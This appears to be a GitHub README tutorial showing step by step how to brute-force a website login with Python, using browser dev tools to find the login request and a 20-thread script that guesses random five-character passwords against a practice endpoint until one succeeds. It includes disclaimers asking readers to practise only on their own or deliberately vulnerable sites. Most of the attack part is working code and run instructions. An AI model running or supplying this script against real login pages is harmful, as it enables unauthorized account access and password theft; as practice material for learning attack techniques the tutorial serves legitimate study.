# Bruteforce-using-Python

A brute force attack is great way to guessing the password. Hacker are always using all possible combination to guess the correct login info. Here I'm create a python script, where I can find password from a website. In this project I know the user name which is "username" and password is 5 letter, however, I don't the password. So my job here to create a random password where I used some common combination of letter and number. Here is my plan before I start this project: 

First, Look for a vulenable website which is authorized to hack. If I can't either create a basic login website or use metasploit. 
Second, use windows instead of macOS. It have more fucntion and easy to use. Specially "Metasploit" only works on windows and linux machine.
Third, Install python in my system.
Fourth, work on a python code which can generates random letter or number. 

Disclaimer: Please don't use this in an actual website. Because this is not an ethical hacker do. You can just use it just for practice or learn. This is totally illigal, you might get charge for this. So, my advice will be use this on your created login environment or the best way to practice is "Metasploit". Which create a vulerabile website to play around it. 

Before, I'm going to start I need a login website where I can hack ethically. So I choose this website: 
![Screen Shot 2022-05-07 at 5 22 24 PM](https://user-images.githubusercontent.com/93491482/167317020-c1af716e-6a2c-4a77-982c-024160f7b75e.png)

Then click right side on your mouse then click "Inspect"
![Screenshot 2022-05-08 17 30 37](https://user-images.githubusercontent.com/93491482/167319390-229f3873-9868-40ef-839f-dad6cefa07a9.png)


On the top you will find "Network" option. If you don't click on ">>" and select on "Network" menu. After that, definetly you are not goning to see anything it will empty. 
![Screenshot 2022-05-08 17 44 02](https://user-images.githubusercontent.com/93491482/167319398-270c4900-0fd5-4a8a-bc55-afba31cd4439.png)


Now, You can use any username and password and try to login. Then the website will say "Failed to login!" and you can see in "Inspect" file, under the "Name" section it calls "confirm-login". Click and you will see there are some subcategory called - "General, Response, Response Headers". In General category you will copy the "Request URL". This is your target machine/website. [Note: to check you used username and password click on payload, you will see the username and password you just used to check the website]
![Screenshot 2022-05-08 17 50 48](https://user-images.githubusercontent.com/93491482/167319412-b7b196a8-a2cb-4eb6-91cf-5f1878067115.png)


## Python Install

We need a python in our system. As I'm using windows, so I will be install python in my windows. 
Go to this website: https://www.python.org/ and Download this file. It will generate your OS device. 
![Screenshot 2022-05-08 18 01 25](https://user-images.githubusercontent.com/93491482/167319420-d88ca0c2-fa4a-4f97-9fdb-b4715aefbf6b.png)


When you are istalling python try to keep this is your C:/ drive. It will easy to use it. Trust me. 
The best way to install python just follow this: https://www.youtube.com/watch?v=bCY4D9n3Pew&t=55s youtube video it will helps a lot. 

## cmd Prompt or Terminal 

Now open to cmd prompt or your terminal and go to your python install directory then type 
```
pip install requests
```
![59AE2604-583E-41AF-B39C-401403830C9A](https://user-images.githubusercontent.com/93491482/167319431-c96c81e2-3486-4f40-9d7f-5583e0101b29.JPG)

If you don't have pip installed in your OS device then you can use this before install requests
```
python get-pip.py
```
## Python Editor
in your isntalled apps search for python editor which is "IDLE(Python 3.10.64-bit)"
![Screenshot 2022-05-08 18 18 11](https://user-images.githubusercontent.com/93491482/167319459-578626b2-76a3-469b-9b4c-fbe6b73d707e.png)


After it opens it, save it as the Name You want to but at end use .py word. Like I save it in my Desktop folder and name it bruteforce.py
![Screenshot 2022-05-08 18 21 11](https://user-images.githubusercontent.com/93491482/167319470-503467bb-720c-43dc-9158-042c83fce8e4.png)


After you save it open the file. 

## Check Python Requests Code
```
import requests
url = " https://requestswebsite.notanothercoder.repl.co/confirm-login"

def send_request(username, password):
    data = {
        "username" : username,
        "password" : password
    }
    
    r = requests.get(url, data=data)
    print(r.text)
```
![Screenshot 2022-05-08 18 29 39](https://user-images.githubusercontent.com/93491482/167319479-6f06e007-3fcb-4fc4-a265-4d86f6d957ee.png)


Then click "Run" >> Run Module >> from the top bar or press f5
![Screenshot 2022-05-08 18 31 43](https://user-images.githubusercontent.com/93491482/167319483-0a15add6-5417-43fb-b086-91e5d8f78a1e.png)


Then the will be "IDLE Shell" interface will be pop-up.
![Screenshot 2022-05-08 18 32 50](https://user-images.githubusercontent.com/93491482/167319493-3a3e85ba-76c8-4be5-bfda-03904db637ce.png)


Type
```
send_request("hi","hi")
```
as I used hi as my username and password so it. will say in a blue color that "Failed to login!". If it shows "Failed to login!" that means it request is working. 
![Screenshot 2022-05-08 18 35 22](https://user-images.githubusercontent.com/93491482/167319506-0d93f829-ec8b-4494-b26c-5b67e6ce9f9b.png)



## Python Code

```
import requests
import random
from threading import Thread
import os

url = "https://requestswebsite.notanothercoder.repl.co/confirm-login"
username = 'username'


def send_request (username, password):
    data = {
        "username" : username,
        "password" : password
    }
    r = requests.get(url, data=data)
    print(r.text)
    return r

chars = "abcdefghijklmnopqrstuvwxyz0123456789"

def main():
    while True:
        if "correct_pass.txt" in os.listdir():
            break
        valid = False
        while not valid:
            rndpasswd = random.choices(chars, k=5)
            passwd = "".join(rndpasswd)
            file = open("tries.txt", 'r')
            tries = file.read()
            file.close()
            if passwd in tries:
                pass
            else:
                valid = True
            
        r = send_request(username, passwd)

        if 'failed to login' in r.text.lower():
            with open("tries.txt", "a") as f:
                f.write(f"{passwd}\n")
                f.close()
            print(f"Incorrect {passwd}\n")
        else:
            print(f"Correct Password {passwd}!\n")
            with open("correct_pass.txt", "w") as f:
                f.write(passwd)
            break


for x in range(20):
    Thread(target=main).start()
```                                  
 
## Run Python Code
Now my whole python code is ready to use. But before I hit the run key, i have to make a file called tries.txt and it will be in the same directory as bruteforce.py. In my my case as I saved bruteforce.py file in Desktop so I create a text file in desktop. And called as tries.txt
![Screenshot 2022-05-08 18 44 03](https://user-images.githubusercontent.com/93491482/167319525-f339b4b7-24a3-42cc-826c-4f59c14e84f6.png)


Run it using f5 on your keyboard or click Run from the tab >> Run Module
![Screenshot 2022-05-08 18 40 59](https://user-images.githubusercontent.com/93491482/167319534-67aba223-0fe2-42f1-9757-8ac8c00ab8b2.png)


"IDLE Shell" file will be open automatically and it shows bunch on Incorrent password combination. It probably take 2-3 mins(tike for your tea break). Then this loop will be stop after it find the correct password.
![Screenshot 2022-05-08 17 05 55](https://user-images.githubusercontent.com/93491482/167319548-9e722e89-e232-4158-998b-cb5791fd72d1.png)

and if you open tries.txt file, you can see lots of failed password combination. Mine was 16511 wrong password. 
![Screenshot 2022-05-08 18 52 44](https://user-images.githubusercontent.com/93491482/167319566-0fbbb43a-4697-4dd5-a5a8-c98a2a818184.png)

correct password will be found in your same folder where is your bruteforce.py and .tries.txt file was created. And it will create a .txt file for you which name is correct_pass.txt. 
If you open the correct_pass.txt, you will see the correct password.
![Screenshot 2022-05-08 17 05 30](https://user-images.githubusercontent.com/93491482/167319560-8af87d61-bf32-4ef8-b347-2b13901254de.png)


##### Congratutaion!! After straight two days of work Successfully I can crack the password. 

# Note: Please, Please don't use it in actual website. It not only just demage the victim, but it will demage you. 
